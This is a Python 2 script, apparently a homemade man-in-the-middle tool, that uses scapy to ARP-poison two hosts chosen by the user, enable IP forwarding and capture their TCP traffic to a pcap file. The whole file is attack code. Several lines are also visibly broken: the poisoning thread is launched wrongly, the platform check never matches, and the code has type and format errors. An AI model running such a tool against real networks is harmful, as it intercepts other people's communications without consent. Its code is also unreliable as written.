import socket, sys, time, os, platform, urllib2
from thread import start_new_thread
from scapy.layers.l2 import arping, Ether, send, ARP
from scapy.all import sniff, wrpcap
from scapy.layers.inet import TCP
from datetime import datetime as dt

def main():
    print('Welcome to MITM')

    if not is_connected():
        sys.stderr.write('[!] Not connected to internet. Please fix internet connection and run MITM again.\n[*] Exiting...')
        exit(-1)


    print("Enter the two IP addresses to MITM:")
    ip_addr1 = raw_input('First IP: ')
    ip_addr2 = raw_input('Second IP: ')

    while not is_valid_ip(ip_addr1):
        print('[!] First IP not valid')
        ip_addr1 = raw_input('First IP: ')

    while not is_valid_ip(ip_addr2):
        print('[!] Second IP not valid')
        ip_addr2 = raw_input('Second IP: ')

    print('[*] Retrieving MAC Addresses...')
    mac_addr1 = get_mac_addr(ip_addr1)
    mac_addr2 = get_mac_addr(ip_addr2)

    if not mac_addr1 or not mac_addr2:
        sys.stderr.write('[!] Unable to retrieve MAC Address of %s\n[*] Exiting...' % ip_addr1 if not mac_addr1 else ip_addr2)
        exit(-1)

    print('[*] MAC Address of First IP: %s' % mac_addr1)
    print('[*] MAC Address of Second IP: %s' % mac_addr2)

    enable_ip_forwarding()
    start_new_thread(arp_poison(),(ip_addr1, mac_addr1, ip_addr2, mac_addr2))

    pkts = sniff(filter="tcp", prn=sniff_callback, count=2)
    file = dt.now() + '.pcap'
    print('[*] Writing packets to %s...' % file)
    wrpcap(file, pkts)
    print('[*] Succesfully wrote %d packets to %s' % len(pkts), file)


def sniff_callback(pkt):
    pkt.show()
    pkt[TCP].payload = str()


def arp_poison(ip_addr1, mac_addr1, ip_addr2, mac_addr2):
    print('[*] Starting ARP Poison')
    try:
        while True:
            send(ARP(op=ARP.is_at, pdst=ip_addr1, hwdst=mac_addr1, psrc=ip_addr2))
            send(ARP(op=ARP.is_at, pdst=ip_addr2, hwdst=mac_addr2, psrc=ip_addr1))
            time.sleep(2)
    except KeyboardInterrupt:
        restore_network(ip_addr1, mac_addr1, ip_addr2, mac_addr2)
        exit(0)


def enable_ip_forwarding():
    print('[*] Enabling IP Forwarding')
    if platform.system == 'Darwin':
        os.system("sysctl -w net.inet.ip.forwarding=1")
    elif platform.system == 'Linux':
        os.system('sysctl -w net.ipv4.ip_forward=1')
    elif platform.system == 'Windows':
        print('[!] MITM not implemented for windows currently')
    print("[*] IP forwarding Enabled")


def restore_network((ip_addr1, mac_addr1, ip_addr2, mac_addr2)):
    print('[*] Restoring Network...')
    send(ARP(op=2, pdst=ip_addr1, hwdst=mac_addr2, psrc=ip_addr2))
    send(ARP(op=2, pdst=ip_addr2, hwdst=mac_addr1, psrc=ip_addr1))
    print('[*] Network Restored')
    print("[*] Disabling IP forwarding...")
    if platform.system == 'Darwin':
        os.system("sysctl -w net.inet.ip.forwarding=0")
    elif platform.system == 'Linux':
        os.system('sysctl -w net.ipv4.ip_forward=0')
    elif platform.system == 'Windows':
        pass
    print("[*] IP forwarding Disabled")


def get_mac_addr(ip_addr):
    ans, unans = arping(ip_addr)

    mac_addr_list = []
    for snd, rcv in ans:
        mac_addr_list.append(rcv[Ether].src)

    if len(mac_addr_list > 0):
        return mac_addr_list[0]
    else:
        return None


def is_valid_ip(ip_addr):
    try:
        socket.inet_aton(ip_addr)
        return True
    except socket.error:
        return False

def is_connected():
    try:
        urllib2.urlopen("http://google.com")
        return True
    except:
        return False

if __name__ == '__main__':
        main()

